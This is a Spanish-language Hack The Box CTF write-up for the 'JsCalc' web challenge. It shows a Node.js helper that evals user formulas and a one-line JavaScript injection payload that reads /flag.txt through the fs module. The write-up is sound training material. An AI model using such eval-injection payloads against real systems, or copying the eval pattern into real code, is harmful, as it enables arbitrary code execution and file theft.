---
title: JsCalc
description: In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! 
date: 2024-06-30
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-challenges/web_logo.png
categories:
  - Challenges
tags:
  - hack_the_box
  - web

---
## Web Analysis

La aplicación web permite al usuario ingresar fórmulas matemáticas que luego son evaluadas y devueltas como resultado en pantalla.

![](/assets/img/htb-writeup-jscalc/jscalc1.png)

El archivo comprimido proporcionado, contiene la estructura del entorno Node.js de la calculadora.

```terminal
/home/kali/Documents/htb/challenges/jscalc:-$ unzip jscalc.zip

/home/kali/Documents/htb/challenges/jscalc:-$ tree web_jscalc
web_jscalc
├── build-docker.sh
├── challenge
│   ├── helpers
│   │   └── calculaorHelper.js
│   ├── index.js
│   ├── package.json
│   ├── package-lock.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── css
│   │   │   └── main.css
│   │   ├── favicon.png
│   │   └── js
│   │       └── main.js
│   ├── views
│   │   └── index.html
│   └── yarm.lock
├── config
│   └── supervisord.conf
├── Dockerfile
├── flag.txt
└── supervisord.conf
```

El archivo `calculatorHelper.js` incluye la función vulnerable. La función `eval()` ejecuta dinámicamente cualquier código JavaScript dentro del string, lo que habilita ejecución arbitraria de código. 
* Referencia: [MDN - eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

```terminal
/home/kali/Documents/htb/challenges/jscalc:-$ cat web_jscalc/challenge/helperscalculatorHelper.js
module.exports = {
  calculate(formula) {
    try {
      return eval(`(function() { return ${ formula } })()`);
    } catch (e) {
      if (e instanceof SyntaxError) {
        return 'Something went wrong!';
      }
    }
  }
}
```

---
## Vulnerability Exploitation

Node.js incluye el módulo `fs` que permite acceder al sistema de archivos. Este código ejecuta directamente `readFileSync`, accede al archivo `flag.txt` y retorna su contenido como string, explotando exitosamente la vulnerabilidad.

`require('fs').readFileSync('/flag.txt').toString();`

![](/assets/img/htb-writeup-jscalc/jscalc2.png)

> <a href="https://labs.hackthebox.com/achievement/challenge/1521382/551" target="_blank">***Litio7 has successfully solved JsCalc from Hack The Box***</a>
{: .prompt-info style="text-align:center" }
